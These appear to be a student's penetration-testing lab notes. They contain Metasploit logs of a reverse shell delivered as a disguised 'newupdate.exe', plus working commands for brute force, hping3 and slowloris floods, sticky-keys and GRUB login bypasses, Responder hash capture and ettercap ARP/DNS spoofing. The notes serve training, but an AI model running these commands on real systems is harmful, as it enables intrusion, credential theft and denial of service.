+[*] Started reverse TCP handler on 192.168.56.124:4444 
+[*] Sending stage (240 bytes) to 192.168.56.117
+[*] Command shell session 1 opened (192.168.56.124:4444 -> 192.168.56.117:49696) at 2025-12-24 00:44:18 +0530
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.14393]
+-----
+          
+
+C:\Users\tinku\Downloads>history
+history
+'history' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\tinku\Downloads>exit
+exit
+
+[*] 192.168.56.117 - Command shell session 1 closed.  Reason: User exit
+msf exploit(multi/handler) > history
+22   search smb_version
+23   use 0
+24   set RHOSTS 192.168.56.115
+25   run
+26   exit
+27   search transopen
+28   search trans2open
+29   use 1
+30   set payload /linux/x86/shell_reverse_tcp
+31   show payload
+32   exploit
+33   exit
+34   search trans2open
+35   use 1
+36   show payload
+37   show payloads
+38   set payload payload/linux/x86/shell_reverse_tcp
+39   exploit
+40   sessions
+41   sessions -t 3
+42   sessions -i 3
+43   sessions
+44   ls
+45   options
+46   clear
+47   exit
+48   search trans2open
+49   use 1
+50   set payload payload/linux/x86/shell/reverse_tcp
+51   set RHOSTS 192.168.56.115
+52   set LHOST 192.168.56.124
+53   options
+54   run
+55   sessions
+56   session -i 3
+57   sessions -i 3
+58   exit -y
+59   search smbclient_version
+60   search smb_version
+61   use 90
+62   use 0
+63   options
+64   set RHOSTS 192.168.56.115
+65   RUN
+66   run
+67   exi t
+68   exit
+69   search trans2open
+70   use 1
+71   set payload payload/linux/x86/shell/reverse_tcp
+72   set RHOSTS 192.168.56.115
+73   OPTIONS
+74   options
+75   set LHOST 192.168.56.124
+76   options
+77   run
+78   sessions
+79   sessions -i 3
+80   search hfs
+81   use 4
+82   show payload
+83   show payloads
+84   set payload payload/windows/shell/reverse_tcp
+85   options
+86   set RHOSTS 192.168.56.118
+87   set LHOST 192.168.56.124
+88   OPTIONS
+89   options
+90   exploit
+91   run
+92   exit
+93   search hfs
+94   use 4
+95   show payloads
+96   set payload 164
+97   set RHOSTS 192.168.56.118
+98   set LHOST 192.168.56.124
+99   run
+100  set RHOSTS 192.168.56.118
+101  options
+102  set LPORT 4443
+103  exploit
+104  exit
+105  search hfs
+106  use 4
+107  set payload 164
+108  set RHOSTS 192.168.56.117
+109  set LHOST 192.168.56.124
+110  run
+111  history
+112  exit
+113  use exploit /multi/handler
+114  use exploit/multi/handler
+115  clear
+116  set payload payload/windows/shell/reverse_tcp
+117  options
+118  set LHOST 192.168.56.124
+119  set LPORT 4444
+120  run
+121  history
+msf exploit(multi/handler) > exit
+                                                                                                                              
+┌──(star㉿kali)-[~]
+└─$ history 
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  ip a
+   10  clear
+   11  sudo netdiscover -r 192.168.56.0/24
+   12  clear
+   13  sudo msfconsole
+
+
+┌──(star㉿kali)-[~]
+└─$ sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.124 LPORT=4444 -f exe -o newupdate.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: newupdate.exe
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ ls
+Desktop  Documents  Downloads  Music  newupdate.exe  Pictures  Public  Templates  Videos
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo python -m http.server                                                                        
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.56.117 - - [24/Dec/2025 00:43:25] "GET / HTTP/1.1" 200 -
+192.168.56.117 - - [24/Dec/2025 00:43:25] code 404, message File not found
+192.168.56.117 - - [24/Dec/2025 00:43:25] "GET /favicon.ico HTTP/1.1" 404 -
+192.168.56.117 - - [24/Dec/2025 00:44:06] "GET /newupdate.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ history                   
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  sudo netdiscover
+   10  searchsploit HFS 2.3
+   11  sudo msfconsole
+   12  searchsploit HFS 2.3
+   13  sudo msfconsole
+   14  searchsploit HFS 2.3
+   15  clear
+   16  sudo nmap -sV -O --script=vulner 192.168.56.118/24
+   17  sudo nmap -sV -O --script=vulners 192.168.56.118/24
+   18  sudo netdiscover
+   19  sudo netdiscover -r 192.168.56.0/24
+   20  sudo nmap -sV -O --script=vulners 192.168.56.117/24
+   21  searchsploit HFS 2.3
+   22  sudo msfconsole
+   23  history
+   24  clear
+   25  sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.124 LPORT=4444 -f exe -o newupdate.exe
+   26  ls
+   27  sudo python -m http.server
+sudo nmap -sV -O --scripts=vulners ip
+sudo msfconsole
+searchsploit hfs 2.3
+search payload
+set RHOSTS
+set LHOST
+set LPORT
+set PAYLOAD windows/shell/reverse_tcp
+
+
+
+
+
+sudo nmap networked
+start wireshark
+
+
+offline password cracking tools
+john, rockyou.txt, hashing algorithms adv is can crack zip, pki, documents, hashcat restricts the other only for passwords.
+
+online password cracking tools
+hydra--> userlist txt, admin, user1,password txt-->(password, password1, password2) for each user check login
+
+hydra -h
+
+windows target
+hydra -l ftp1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.168.8
+
+nano userlist.txt--> add all possible username i.e ftp1 ftpuser1 ftp2 ftpuser2 each line
+
+hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.168.8
+
+
+
+
+msfvenom -h
+
+msfvenom -l payloads
+
+msfvenom -l formats
+
+msfvenom -h
+
+*****dos attack using icmp
+ping -h
+ping -h | grep source
+sudo ping -f 1 ip
+sudo ping -s 2048 ip
+hping3
+
+
+sudo hping3 --icmp --flood --spoof ip (wireshark to monitor)
+
+sudo hping3 --icmp --spoof ip (wireshark to monitor)
+
+sudo hping3 --icmp --flood --spoof ip --flood ip (wireshark to monitor)
+
+*****TCP
+sudo hping3 -p port ip
+
+sudo hping3 --flood -p port ip
+ping flood attack
+
+ssh2john key password finder
+
+In kali Linux ssh is not started already systemctl start ssh remote dos attack
+
+sudo visudo--> cat /etc/group | grep sudo ---> sudo adduser username1 (vm2 sudo adduser username1)
+
+sudo visudo --> username1 ALL=(ALL:ALL) NOPASSWD: ALL ---> su username1
+
+
+ssh-keygen -t rsa 
+ls .ssh ---> id_rsa.pub
+ssh-copy-id -i .ssh/id_rsa.pub
+
+sudo nano ping-dos.sh
+	#!/bin/bash
+	ssh -t remote1@ip sudo hping3 --icmp --flood targetip &> /dev/null
+	sudo hping3 --icmp --flood targetip
+
+chmod +x filename
+./ping-dos.sh
+ssh -t remote1@vm2ip "sudo hping3 --icmp --flood -q targetip"
+
+ssh -t remote username@ip command(sudo ls / sudo mkdir /ditiss --> sudo hping3)
+
+pidof hping3
+ps aux | grep hping3
+sudo kill pid
+
+
+sudo hping3 --flood -p portno ip -----> icmp replace by tcp
+
+
+slowloris dos attack
+slowloris github/gkbrk/slowloris --->.py file pip install or use clone ---> ( git clone)
+sudo pyhton3 slowloris.py (-p 8000, -s 2500) targetip
+
+pyhton3 slowloris.py -h
+
+
+---------------:windows password bypass:-------------
+boot with cd
+repair your computer --> troubleshoot --> cmd --> dir --> cd windows/sys32
+
+dir sethc.exe
+ren sethc.exe sethc.exe.bak(rename file)
+
+copy cmd.exe sethc.exe
+
+exit
+
+turnoff---> poweron --> shift * 5-->
+
+whoami ---> net user username password /add
+
+net user administrator password
+
+net localgroup administrator username
+
+exit
+
+---------------:Linux password bypass:------------- se linux
+redhat{sudo getenforce enforcing -SELINUX is working sudo setenforce --permissive}
+press esc to get grub boot loader ---> e press --> Linux vmlinuz  at end remove rhgb quit add init=/bin/bash --> ctrl-X or f10 ---> touch  ./autorelable -->whoami -->
+
+adduser usrname ---> sudo visudo root remove last all  ---> username ALL=(ALL:ALL) NOPASSWD: ALL(no passwd require for all sudo command) ---> exit
+
+
+adv options select 1 for kali Linux ---> press e ---> grub loader ---> add rw init=/bin/bash to end ro quit --> ctrl-X ---> get prompt --->whoami
+
+ls --> # /usr/sbin/useradd demo1 ---> # mount--> mount -o remount,rw /--> touch  ./autorelable ---> /usr/sbin/useradd demo1 ----> _ --->exit 
+
+
+
+adduser usrname ---> sudo visudo root remove last all  ---> username ALL=(ALL:ALL) NOPASSWD: ALL ---> exit
+
+
+
+
+smb relay attack -- man middile
+responder -h
+sudo responder -I eth0 -D
+
+request file in windows \\192.168.43.14\file
+
+nano winhash.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt winhash.txt
+
+https://github.com/fortra/impacket
+
+hashcat hash types
+
+sudo hashcat -a 0 -m 5600 wnhash.txt /user/share/wordlists/rockyou.txt
+
+create two user in win 
+
+
+man in the middle (MITM):- ARP spoofing with in the network. when user on c1 computer accesses c2 computer then c1 does arp tofind mac address of c2 computer. Similarly c2 computer also finds the mac address of c1 computer. Both the computers store that information in arp cache
+
+
+eattercap:-- nat mode windows 11 and win server ---> mac win11 ipconfig /all  for both machine arp -a---> arp cache
+ promiscus mode ---> wireshark ----> win 11 ftp winserver --> allot ports 20,21--> win 11 ftp winserver <-- not work in real life
+
+sudo nono /etc/ettrcap/Etter.conf id (ec gid , dredir ip v4 enable  choose interface select unoffensive accept stop mitm targets hosts options visisble. host--> scan for host -->host server stack select host ctrl+click add to target1 win11 add target 2.--> mitm menu arp poisoning--> start sniffing --> start wiresharkSSS
+
+sudo ettercap -G
+
+
+
+dns spoofing (win server)--> nat network winserver and kali find new ip address ip -a ipconfig --> on win manual dns as 10.0.2.2 --> ping win to kali by nat --> on kali note the network interface nat-net mode --> start Ettercap sudo ettercap -G --> select the nat network interface i.e. eth0/1/2/3 --> win nat dns 10.0.2.2 --> target 1 winserver dns 10.0.2.2 --> target 2 winserver ip-->arp poisoning 
